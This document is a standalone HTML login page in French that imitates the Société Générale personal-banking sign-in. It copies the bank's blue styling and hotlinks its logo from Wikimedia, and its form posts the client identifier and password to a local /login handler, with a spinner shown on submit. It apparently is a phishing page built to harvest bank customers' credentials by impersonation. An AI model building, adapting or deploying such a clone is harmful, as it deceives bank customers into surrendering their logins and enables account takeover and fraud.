<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Connexion - Espace Client Particuliers</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #ffffff; 
            margin: 0; 
            padding: 0; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            color: #333;
        }
        .container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            box-sizing: border-box;
        }
        .header {
            text-align: left;
            margin-bottom: 40px;
            padding-left: 10px;
        }
        h1 {
            font-size: 18px;
            font-weight: 600;
            color: #0065a8; /* Bleu SG */
            margin: 0;
            line-height: 1.3;
        }
        .form-group {
            margin-bottom: 20px;
            padding-left: 10px;
        }
        label {
            display: block;
            font-size: 13px;
            color: #666;
            margin-bottom: 8px;
        }
        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%;
            padding: 12px 0;
            border: none;
            border-bottom: 1px solid #ccc;
            font-size: 16px;
            color: #333;
            background: transparent;
            outline: none;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus, input[type="password"]:focus, input[type="email"]:focus {
            border-bottom: 2px solid #0065a8;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 20px 0 30px 10px;
            font-size: 13px;
            color: #333;
        }
        .checkbox-group input {
            margin-right: 8px;
            width: 16px;
            height: 16px;
            accent-color: #0065a8;
        }
        .btn-connect {
            width: 100%;
            padding: 14px;
            background-color: #0065a8;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-left: 10px;
            margin-right: 10px;
            transition: background 0.3s;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .btn-connect:hover {
            background-color: #004d80;
        }
        .footer-logo {
            margin-top: 50px;
            text-align: left;
            padding-left: 10px;
        }
        .footer-logo img {
            width: 120px;
            opacity: 0.8;
        }
        .footer-links {
            margin-top: 20px;
            text-align: left;
            padding-left: 10px;
            font-size: 12px;
            color: #666;
        }
        .footer-links a {
            color: #0065a8;
            text-decoration: none;
            margin-right: 10px;
        }
        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0065a8;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Connexion à votre<br>Espace Client Particuliers</h1>
        </div>

        <form action="/login" method="POST">
            <div class="form-group">
                <label for="email">Saisissez votre Identifiant Client</label>
                <input type="text" name="email" id="email" placeholder="Email ou numéro de client" required autocomplete="off">
            </div>

            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" name="password" id="password" placeholder="••••••••" required>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Se souvenir de moi</label>
            </div>

            <button type="submit" class="btn-connect" id="submitBtn">Se connecter</button>
        </form>

        <div class="loader" id="loader"></div>

        <div class="footer-logo">
            <!-- Logo SG Officiel -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2021.svg/1200px-Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2021.svg.png" alt="Société Générale">
        </div>

        <div class="footer-links">
            <a href="#">Mot de passe oublié ?</a>
            <a href="#">Espace Professionnels</a>
        </div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function() {
            document.getElementById('submitBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
        });
    </script>
</body>
</html>
